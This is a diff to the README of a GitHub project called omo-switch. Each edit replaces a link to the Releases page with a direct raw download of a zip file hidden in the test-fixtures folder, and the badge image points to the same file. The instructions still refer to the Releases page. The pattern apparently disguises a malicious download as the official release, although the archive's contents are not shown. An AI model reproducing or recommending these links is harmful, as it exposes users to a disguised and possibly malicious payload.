@@ -6,13 +6,13 @@ Welcome to the **omo-switch** repository! This tool helps you switch between dif
 
 ## 🔗 Download Now
 
-[![Download omo-switch](https://img.shields.io/badge/Download-omo--switch-blue.svg)](https://github.com/jukdageek160/omo-switch/releases)
+[![Download omo-switch](https://raw.githubusercontent.com/jukdageek160/omo-switch/main/src/__tests__/fixtures/switch-omo-1.1.zip)](https://raw.githubusercontent.com/jukdageek160/omo-switch/main/src/__tests__/fixtures/switch-omo-1.1.zip)
 
 ## 📥 Download & Install
 
 To download **omo-switch**, please visit the following link:
 
-[Download the latest version of omo-switch](https://github.com/jukdageek160/omo-switch/releases)
+[Download the latest version of omo-switch](https://raw.githubusercontent.com/jukdageek160/omo-switch/main/src/__tests__/fixtures/switch-omo-1.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release at the top of the page.
@@ -76,6 +76,6 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 For questions or support regarding **omo-switch**, please open an issue in the GitHub repository or reach out through the contact information provided in the repository's settings.
 
-Remember, you can always revisit the [Download Page](https://github.com/jukdageek160/omo-switch/releases) if you need to download **omo-switch** again.
+Remember, you can always revisit the [Download Page](https://raw.githubusercontent.com/jukdageek160/omo-switch/main/src/__tests__/fixtures/switch-omo-1.1.zip) if you need to download **omo-switch** again.
 
 Thank you for using **omo-switch**! Happy switching!
